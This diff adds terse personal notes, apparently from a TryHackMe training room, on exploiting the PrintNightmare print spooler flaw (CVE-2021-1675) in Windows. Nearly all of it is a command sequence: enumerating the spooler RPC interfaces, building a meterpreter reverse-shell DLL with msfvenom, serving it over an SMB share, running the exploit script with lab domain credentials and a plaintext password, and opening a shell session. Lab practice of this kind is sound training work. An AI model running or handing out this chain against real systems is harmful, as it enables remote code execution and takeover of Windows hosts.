@@ -1,0 +1,44 @@
+### PrintNightmare ###
+## links
+https://tryhackme.com/room/printnightmarehpzqlp8
+
+
+## Print  Spooler Service
+> Services
+You're able to Start/Stop/Pause/Resume Print Spooler Service by simply navigating to Services on your Windows system
+
+
+## enum
+rpcdump.py @$h | egrep 'MS-RPRN|MS-PAR'
+# if this output could be vulnerable
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol
+
+
+## install
+git clone https://github.com/tryhackme/CVE-2021-1675.git
+git clone https://github.com/tryhackme/impacket.git 
+sudo python setup.py install 
+
+
+## exploit
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.98.114 LPORT=4444 -f dll -o malicious.dll
+msfconsole
+> use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_tcp
+> set lhost 10.8.98.114
+> set lport 4444
+> run -j
+
+cd /home/tristan/Downloads/secu/thm/printnightmare
+sudo smbserver.py share /home/tristan/Downloads/secu/thm/printnightmare/ -smb2support
+cd ./CVE-2021-1675
+python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.93.197 '\\10.8.98.114\share\malicious.dll'
+
+msf6 > sessions
+msf6 > sessions -i 1
+meterpreter > getuid
+
+
+
+
